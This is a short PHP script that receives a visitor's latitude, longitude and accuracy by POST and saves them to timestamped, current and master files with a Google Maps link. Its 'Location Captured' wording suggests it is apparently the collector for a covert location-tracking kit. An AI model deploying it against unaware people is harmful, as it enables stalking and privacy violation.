<?php
$date = date('dMYHis');
$latitude = $_POST['lat'] ?? null;
$longitude = $_POST['lon'] ?? null;
$accuracy = $_POST['acc'] ?? null;

if (empty($latitude) || empty($longitude)) {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing']);
    exit;
}

$data = "Latitude: " . $latitude . "\r\n" .
        "Longitude: " . $longitude . "\r\n" .
        "Accuracy: " . ($accuracy ?? 'N/A') . " meters\r\n" .
        "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
        "Date: " . $date . "\r\n";

$locationFile = '/data/locations/location_' . $date . '.txt';
file_put_contents($locationFile, $data, LOCK_EX);

$currentFile = '/data/locations/current_location.txt';
file_put_contents($currentFile, $data, LOCK_EX);

$masterFile = '/data/locations/saved.locations.txt';
file_put_contents($masterFile, "\n=== New Location Captured ===\n" . $data . "\n", FILE_APPEND | LOCK_EX);

file_put_contents('/data/logs/LocationLog.log', "Location captured at " . date('c') . "\n", FILE_APPEND | LOCK_EX);

header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'message' => 'Location data received']);
